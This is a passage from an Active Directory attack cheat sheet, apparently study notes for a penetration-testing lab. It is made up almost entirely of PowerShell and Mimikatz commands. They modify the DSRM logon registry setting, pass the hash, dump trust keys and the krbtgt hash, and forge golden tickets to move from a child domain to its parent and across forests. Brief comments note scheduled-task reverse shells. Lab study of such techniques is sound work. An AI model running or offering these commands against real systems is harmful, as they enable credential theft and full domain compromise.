# First one is the DSRM local Administrator
```

OPTH the DSRM pass to authenticate, but the logon behaviour needs to be changed:  

```powershell
Enter-PSSession -Computername us-dc
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD

# OPTH:
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:<dc> /user:Administrator /ntlm:<hash> /run:powershell.exe"'
ls \\<dc>\C$
# To use PSRemoting, we must force NTLM authentication:
Enter-PSSession -ComputerName us-dc -Authentication Negotiate
```

## Child to Parent Domain

```powershell
# Trust tickets
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName <dc-computer-name>
# Forge inter-realm TGT - <sid> is the SID of the current domain <sids> is the SID of the enterprise admins group of the parent domain
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:full.domain.local /sid:<sid string> /sids:<sids string> /rc4:<rc4 ntlm> /service:krbtgt /target:domain.local /ticket:C:\AD\Tools\kekeo_old\trust_tkt.kirbi"'
# Present forged ticket and request a new ticket for the new filesystem
.\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi HOST/target.domain.local
.\kirbikator.exe lsa .\HOST.target.domain.local.kirbi
# Scheduled task reverse shell

# With krbtgt hash
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName <dc-computer-name>    # to get krbtgt hash
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:full.domain.local /sid:<sid string> /sids:<sids string> /krbtgt:<krbtgt ntlm> /ptt"'
# Scheduled task reverse shell
```

## Cross Forest

```powershell
# Get machine hash for target forest
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName <dc-computer-name>
# Forge inter-forest TGT
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:full.domain.local /sid:<sid string> /rc4:<rc4 hash from above command> /service:krbtgt /target:targetforest.local /ticket:C:\AD\Tools\kekeo_old\trust_forest_tkt.kirbi"'
.\asktgs.exe C:\AD\Tools\kekeo_old\trust_forest_tkt.kirbi CIFS/target-dc.domain.local # Also try HOST to schedule tasks
.\kirbikator.exe lsa .\CIFS.target-dc.domain.local.kirbi
# If CIFS, use Invoke-ShareFinder -CheckShareAccess -Domain <target-domain> to find where you can read
```
